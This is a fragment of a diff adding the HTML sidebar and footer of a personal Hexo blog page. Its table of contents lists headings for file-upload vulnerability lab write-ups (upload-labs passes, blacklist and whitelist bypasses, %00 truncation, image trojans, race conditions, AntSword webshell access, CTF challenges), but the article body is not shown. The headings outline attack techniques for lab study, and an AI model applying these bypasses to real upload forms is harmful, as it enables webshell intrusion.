href="#%E6%98%8E%E7%A1%AE%E5%93%AA%E4%BA%9B%E5%8F%82%E6%95%B0%E8%83%BD%E7%94%A8%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9"><span class="nav-number">1.3.4.</span> <span class="nav-text">明确哪些参数能用抓包工具修改</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%BE%E4%BE%8B-labs-1-%E6%B5%81%E7%A8%8B"><span class="nav-number">1.4.</span> <span class="nav-text">文件上传的举例(labs-1 流程)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E8%8E%B7%E5%8F%96%E7%BD%91%E9%A1%B5%E6%96%87%E4%BB%B6"><span class="nav-number">1.5.</span> <span class="nav-text">蚁剑获取网页文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week6-2-%E5%AE%9E%E9%AA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.</span> <span class="nav-text">[Week6.2]实验:文件上传漏洞举例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF-MIME-%E7%B1%BB%E5%9E%8B%E6%A0%A1%E9%AA%8C"><span class="nav-number">2.1.</span> <span class="nav-text">后端 MIME 类型校验</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-02-%E5%AE%9E%E9%AA%8C%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.1.1.</span> <span class="nav-text">pass-02 实验举例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E7%BC%80%E5%90%8D%E9%BB%91%E5%90%8D%E5%8D%95%E6%A0%A1%E9%AA%8C"><span class="nav-number">2.2.</span> <span class="nav-text">后缀名黑名单校验</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-03-%E5%AE%9E%E9%AA%8C%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.2.1.</span> <span class="nav-text">pass-03 实验举例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E5%A4%9A%E5%8F%AF%E8%A1%8C%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">2.2.2.</span> <span class="nav-text">更多可行的绕过方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E-php-%E8%A7%A3%E6%9E%90%E6%96%B9%E5%BC%8F-%E7%BB%95%E8%BF%87-%E2%80%9C%E8%B6%85%E5%BC%BA%E5%90%8E%E7%BC%80%E9%BB%91%E5%90%8D%E5%8D%95%E2%80%9D%EF%BC%88-htaccess-%E5%A4%A7%E6%B3%95%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">[非 php 解析方式]绕过 “超强后缀黑名单”（.htaccess 大法）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-04-%E5%AE%9E%E9%AA%8C%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.3.1.</span> <span class="nav-text">pass-04 实验举例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95-%E7%BB%95%E8%BF%87-%E2%80%9C%E8%81%94%E5%90%88%E8%BF%87%E6%BB%A4%E2%80%9D"><span class="nav-number">2.4.</span> <span class="nav-text">[黑名单]绕过 “联合过滤”</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-09-%E5%AE%9E%E9%AA%8C%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.4.1.</span> <span class="nav-text">pass-09 实验举例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95-%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%EF%BC%88%E9%BB%91%E5%90%8D%E5%8D%95-%E5%8D%95%E6%AC%A1%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="nav-number">2.5.</span> <span class="nav-text">[黑名单]双写后缀绕过（黑名单 + 单次字符过滤）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-10-%E5%AE%9E%E9%AA%8C%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.5.1.</span> <span class="nav-text">pass-10 实验举例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95-GET-%E5%8F%82%E6%95%B0-00-%E7%A9%BA%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD%EF%BC%88%E7%99%BD%E5%90%8D%E5%8D%95-%E5%8F%AA%E6%A3%80%E6%B5%8B%E6%8B%93%E5%B1%95%E5%90%8D-%E6%8B%BC%E6%8E%A5%E4%BF%9D%E5%AD%98%EF%BC%89"><span class="nav-number">2.6.</span> <span class="nav-text">[白名单]GET 参数 %00 空字符截断（白名单&#x2F;只检测拓展名 + 拼接保存）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-11-%E5%AE%9E%E9%AA%8C%E4%B8%BE%E4%BE%8B-%E4%BC%A0%E8%B7%AF%E5%BE%84"><span class="nav-number">2.6.1.</span> <span class="nav-text">pass-11 实验举例(传路径)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95-POST-%E5%8F%82%E6%95%B0-0x00-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%88%AA%E6%96%AD%EF%BC%88%E7%99%BD%E5%90%8D%E5%8D%95%E8%BF%9B%E9%98%B6%EF%BC%89"><span class="nav-number">2.7.</span> <span class="nav-text">[白名单]POST 参数 0x00 十六进制截断（白名单进阶）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-12-%E5%AE%9E%E9%AA%8C%E4%B8%BE%E4%BE%8B-post-%E4%BC%A0%E8%B7%AF%E5%BE%84"><span class="nav-number">2.7.1.</span> <span class="nav-text">pass-12 实验举例(post 传路径)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E9%A9%AC-%E7%BB%95%E8%BF%87-%E2%80%9C%E6%96%87%E4%BB%B6%E5%B9%BB%E6%9C%AF%E5%A4%B4%E6%A0%A1%E9%AA%8C%E2%80%9D"><span class="nav-number">2.8.</span> <span class="nav-text">[图片马]绕过 “文件幻术头校验”</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-13-%E5%AE%9E%E9%AA%8C%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.8.1.</span> <span class="nav-text">pass-13 实验举例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-14-15-%E5%AE%9E%E9%AA%8C%E8%AF%B4%E6%98%8E"><span class="nav-number">2.8.2.</span> <span class="nav-text">pass-14&#x2F;15 实验说明</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E9%A9%AC-%E7%BB%95%E8%BF%87-%E2%80%9C%E5%9B%BE%E7%89%87%E4%BA%8C%E6%AC%A1%E5%A4%84%E7%90%86-%E7%9C%9F%E5%9B%BE%E7%89%87%E6%A0%A1%E9%AA%8C%E2%80%9D"><span class="nav-number">2.9.</span> <span class="nav-text">[图片马]绕过 “图片二次处理 + 真图片校验”</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-16-%E5%AE%9E%E9%AA%8C%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.9.1.</span> <span class="nav-text">pass-16 实验举例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.10.</span> <span class="nav-text">条件竞争漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-17-%E5%AE%9E%E9%AA%8C%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.10.1.</span> <span class="nav-text">pass-17 实验举例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-18-%E5%AE%9E%E9%AA%8C%E8%AF%B4%E6%98%8E"><span class="nav-number">2.10.2.</span> <span class="nav-text">pass-18 实验说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-19-%E5%AE%9E%E9%AA%8C%E8%AF%B4%E6%98%8E"><span class="nav-number">2.10.3.</span> <span class="nav-text">pass-19 实验说明</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87-pass-20-%E5%AE%9E%E9%AA%8C%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.11.</span> <span class="nav-text">数组绕过 |pass-20 实验举例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93"><span class="nav-number">2.12.</span> <span class="nav-text">文件上传总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week6-3-%E5%AE%9E%E9%AA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98"><span class="nav-number">3.</span> <span class="nav-text">*[Week6.3]实验:文件上传漏洞实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA-1-20"><span class="nav-number">3.1.</span> <span class="nav-text">文件上传靶场 1-20</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf-Week2-Only-Picture-Up"><span class="nav-number">3.2.</span> <span class="nav-text">?ctf [Week2] Only Picture Up</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA"><span class="nav-number">3.2.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E5%8F%AA%E6%83%B3%E8%A6%81%E4%BD%A0%E7%9A%84-PNG%EF%BC%81-%E4%B8%8D%E4%BC%9A%E5%81%9A"><span class="nav-number">3.3.</span> <span class="nav-text">我只想要你的 PNG！(不会做)</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">legend1440</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Sun Jan 18 2026 08:00:00 GMT+0800 (GMT+08:00) – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">legend1440</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
